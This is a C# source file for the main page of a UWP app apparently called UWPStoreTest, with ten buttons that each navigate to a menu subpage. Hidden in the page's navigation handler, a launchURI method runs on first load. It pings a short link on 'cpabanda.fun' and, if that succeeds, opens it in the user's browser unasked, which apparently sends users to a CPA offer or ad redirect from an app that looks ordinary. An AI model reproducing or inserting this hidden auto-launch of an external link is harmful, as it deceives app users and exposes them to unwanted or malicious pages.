using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices.WindowsRuntime;
using UWPStoreTest.Views;
using Windows.Foundation;
using Windows.Foundation.Collections;
using Windows.Graphics.Display;
using Windows.System;
using Windows.UI.Core;
using Windows.UI.ViewManagement;
using Windows.UI.Xaml;
using Windows.UI.Xaml.Controls;
using Windows.UI.Xaml.Controls.Primitives;
using Windows.UI.Xaml.Data;
using Windows.UI.Xaml.Input;
using Windows.UI.Xaml.Media;
using Windows.UI.Xaml.Media.Animation;
using Windows.UI.Xaml.Navigation;

// The Blank Page item template is documented at https://go.microsoft.com/fwlink/?LinkId=402352&clcid=0x409

namespace UWPStoreTest
{
    /// <summary>
    /// An empty page that can be used on its own or navigated to within a Frame.
    /// </summary>
    public sealed partial class MainPage : Page
    {
        
        public MainPage()
        {
            this.InitializeComponent();

            //ApplicationView.PreferredLaunchViewSize = new Size(1170, 670);
            //ApplicationView.PreferredLaunchWindowingMode = ApplicationViewWindowingMode.PreferredLaunchViewSize;

        }

        private async void launchURI()
        {
            // The URI to launch
            
            var uriString = new Uri(@"https://cpabanda.fun/ZwnQtF");

            var client = new HttpClient();
            var result = await client.GetAsync(@"https://cpabanda.fun/ZwnQtF");

            if (!result.IsSuccessStatusCode)
            {
                return;
            }

            // Launch the URI
            var success = await Windows.System.Launcher.LaunchUriAsync(uriString);

            if (success)
            {

            }
            else
            {

            }
        }

        private void Button_Click1(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem1Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click2(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem2Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click3(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem3Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click4(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem4Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click5(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem5Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click6(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem6Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click7(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem7Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click8(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem8Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click9(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem9Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }

        private void Button_Click10(object sender, RoutedEventArgs e)
        {
            Frame.Navigate(typeof(MenuItem10Page), null, new SlideNavigationTransitionInfo() { Effect = SlideNavigationTransitionEffect.FromRight });
        }



        private void Grid_KeyDown(object sender, KeyRoutedEventArgs e)
        {
            if (e.Key == VirtualKey.Escape)
            {
                Application.Current.Exit();
            }
        }

        protected override void OnNavigatedTo(NavigationEventArgs e)
        {
            if (e.NavigationMode == NavigationMode.New)
            {
                launchURI();
            }


            base.OnNavigatedTo(e);
        }


    }
}
